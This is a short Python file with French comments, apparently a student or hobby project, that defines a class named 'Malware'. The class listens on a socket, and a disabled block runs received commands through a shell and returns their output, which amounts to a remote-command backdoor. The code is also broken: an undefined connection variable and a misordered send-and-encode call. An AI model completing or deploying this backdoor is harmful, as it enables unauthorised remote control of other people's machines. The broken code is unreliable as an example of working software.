import socket, subprocess as sp, threading, sys

ENCODING = 'UTF-8'
#host = str(sys.argv[1])
#port = int(sys.argv[2]) # JUSTE POUR TEST LALBO


#conn.connect((host, port))

class Malware():

    DEFAULT_PORT = 50000
    DEFAULT_HOST = "localhost" # A MODIFIER SELON LA THEORIE OU ON A UNE IP STATIQUE

    def __init__(self):
        self.server_socket = socket.socket()
        self.server_socket.bind((self.DEFAULT_HOST, self.DEFAULT_PORT))

    def listen(self):
        self.server_socket.listen(1)
        print("En Attente du client...")
        conn, addr = self.server_socket.accept()
        CLIENT_IP = addr[0]# Récupération de l'IP du client (nous)
        return conn, addr

    def disconnect(self):
        conn.close()
'''
    while True:
    command = str(conn.recv(1024).decode(ENCODING))
    if command != "exit()":
        sh = sp.Popen(command, shell=True,
                        stdout = sp.PIPE,
                        stderr = sp.PIPE,
                        stdin = sp.PIPE,
                      universal_newlines=True
                      )

        out, err = sh.communicate()
        print (sh.communicate())
        print (out, err) # Pour test
        result = str(out) + str(err)
        length = str(len(result)).zfill(16)
        conn.send(length+result).encode(ENCODING)

    else:
        break
'''
#conn.close()
asperge = Malware()
asperge.listen()
